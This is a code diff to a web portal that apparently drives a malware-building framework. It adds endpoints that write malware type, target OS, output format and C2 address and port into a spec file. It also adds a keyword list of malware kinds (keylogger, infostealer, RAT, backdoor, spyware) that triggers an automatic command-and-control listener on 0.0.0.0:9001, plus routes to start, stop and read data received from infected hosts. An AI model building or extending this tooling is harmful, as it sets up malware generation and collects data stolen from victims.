@@ -10,6 +10,7 @@ import uuid
 from pathlib import Path
 
 import asyncssh
+import yaml
 from aiohttp import web, WSMsgType
 
 FRAMEWORK_ROOT = Path(__file__).parent.parent
@@ -159,6 +160,9 @@ def build_command(data: dict) -> list[str]:
 jobs: dict[str, dict] = {}
 
 
+_C2_MALWARE_KEYWORDS = ("keylog", "infostealer", "info steal", "info-steal", "rat", "backdoor", "spyware")
+
+
 async def _run_subprocess(job_id: str, cmd: list[str]) -> None:
     job = jobs[job_id]
     try:
@@ -184,6 +188,22 @@ async def _run_subprocess(job_id: str, cmd: list[str]) -> None:
         job["status"] = "error"
         err = f"[PORTAL] error starting subprocess: {exc}"
         job["output"].append(err)
+
+    # Auto-start C2 listener for connection-back malware on success
+    if job["status"] == "success":
+        cmd_str = job.get("cmd_str", "").lower()
+        if any(kw in cmd_str for kw in _C2_MALWARE_KEYWORDS):
+            from .c2_listener import listener as c2
+            if not c2.running:
+                ok = await c2.start(port=9001)
+                if ok:
+                    msg = (
+                        "[PORTAL] C2 listener auto-started on 0.0.0.0:9001 "
+                        "-- received data saved to results/c2_received_*.bin"
+                    )
+                    job["output"].append(msg)
+                    for q in list(job["listeners"]):
+                        await q.put(("log", msg))
 
     for q in list(job["listeners"]):
         await q.put(("done", job["status"]))
@@ -246,6 +266,75 @@ async def handle_kill_job(request: web.Request) -> web.Response:
             job["proc"].terminate()
         except ProcessLookupError:
             pass
+    return web.json_response({"ok": True})
+
+
+async def handle_get_spec(request: web.Request) -> web.Response:
+    spec_path = FRAMEWORK_ROOT / "spec.yaml"
+    if not spec_path.exists():
+        raise web.HTTPNotFound(text=json.dumps({"error": "spec.yaml not found"}),
+                               content_type="application/json")
+    content = spec_path.read_text(errors="replace")
+    return web.json_response({"content": content, "path": str(spec_path.resolve())})
+
+
+async def handle_put_spec(request: web.Request) -> web.Response:
+    data = await request.json()
+    content = data.get("content", "")
+    try:
+        yaml.safe_load(content)
+    except yaml.YAMLError as exc:
+        return web.json_response({"error": f"Invalid YAML: {exc}"}, status=400)
+    spec_path = FRAMEWORK_ROOT / "spec.yaml"
+    spec_path.write_text(content)
+    return web.json_response({"ok": True})
+
+
+async def handle_merge_spec(request: web.Request) -> web.Response:
+    """Merge form field values into spec.yaml before a run."""
+    data = await request.json()
+    spec_path = FRAMEWORK_ROOT / "spec.yaml"
+
+    if spec_path.exists():
+        existing = yaml.safe_load(spec_path.read_text()) or {}
+    else:
+        existing = {}
+
+    behavior = (data.get("behavior") or "").strip()
+    malware_type = (data.get("malware_type") or "").strip()
+    if behavior:
+        existing["malware_type"] = behavior
+    elif malware_type:
+        existing["malware_type"] = malware_type
+
+    os_val = (data.get("os") or "").strip()
+    if os_val:
+        existing["os_version"] = os_val
+        if "windows" in os_val.lower():
+            existing["os_platform"] = "windows"
+        elif any(x in os_val.lower() for x in ("ubuntu", "debian", "linux")):
+            existing["os_platform"] = "linux"
+
+    lang = (data.get("source_language") or "").strip()
+    if lang:
+        existing["source_language"] = lang
+
+    fmt = (data.get("output_format") or "").strip()
+    if fmt:
+        existing["output_format"] = fmt
+
+    c2_addr = (data.get("c2_address") or "").strip()
+    if c2_addr:
+        existing["c2_address"] = c2_addr
+
+    c2_port = data.get("c2_port")
+    if c2_port:
+        try:
+            existing["c2_port"] = int(c2_port)
+        except (ValueError, TypeError):
+            pass
+
+    spec_path.write_text(yaml.dump(existing, default_flow_style=False, allow_unicode=True, sort_keys=False))
     return web.json_response({"ok": True})
 
 
@@ -408,6 +497,45 @@ async def handle_ssh_ws(request: web.Request) -> web.WebSocketResponse:
 
 
 # ---------------------------------------------------------------------------
+# C2 listener management
+# ---------------------------------------------------------------------------
+
+from .c2_listener import listener as c2_listener
+
+
+async def handle_c2_status(request: web.Request) -> web.Response:
+    return web.json_response(c2_listener.status())
+
+
+async def handle_c2_start(request: web.Request) -> web.Response:
+    data = await request.json() if request.content_length else {}
+    port = int(data.get("port", 9001))
+    host = data.get("host", "0.0.0.0")
+    ok = await c2_listener.start(port=port, host=host)
+    return web.json_response({"ok": ok, **c2_listener.status()})
+
+
+async def handle_c2_stop(request: web.Request) -> web.Response:
+    await c2_listener.stop()
+    return web.json_response({"ok": True})
+
+
+async def handle_c2_data(request: web.Request) -> web.Response:
+    filename = request.match_info["filename"]
+    if "/" in filename or ".." in filename:
+        raise web.HTTPBadRequest()
+    filepath = RESULTS_DIR / filename
+    if not filepath.exists() or not filename.startswith("c2_received_"):
+        raise web.HTTPNotFound()
+    content = filepath.read_bytes()
+    try:
+        text = content.decode("utf-8", errors="replace")
+    except Exception:
+        text = content.hex()
+    return web.Response(text=text, content_type="text/plain")
+
+
+# ---------------------------------------------------------------------------
 # App factory
 # ---------------------------------------------------------------------------
 
@@ -418,8 +546,15 @@ def create_app() -> web.Application:
     app.router.add_get("/api/jobs", handle_get_jobs)
     app.router.add_get("/api/jobs/{job_id}", handle_get_job)
     app.router.add_post("/api/jobs/{job_id}/kill", handle_kill_job)
+    app.router.add_get("/api/spec", handle_get_spec)
+    app.router.add_put("/api/spec", handle_put_spec)
+    app.router.add_post("/api/spec/merge", handle_merge_spec)
     app.router.add_get("/api/results", handle_get_results)
     app.router.add_get("/api/results/{filename}", handle_get_result_file)
+    app.router.add_get("/api/c2", handle_c2_status)
+    app.router.add_post("/api/c2/start", handle_c2_start)
+    app.router.add_post("/api/c2/stop", handle_c2_stop)
+    app.router.add_get("/api/c2/data/{filename}", handle_c2_data)
     app.router.add_get("/ws/ssh", handle_ssh_ws)
     app.router.add_get("/ws/{job_id}", handle_ws)
     return app
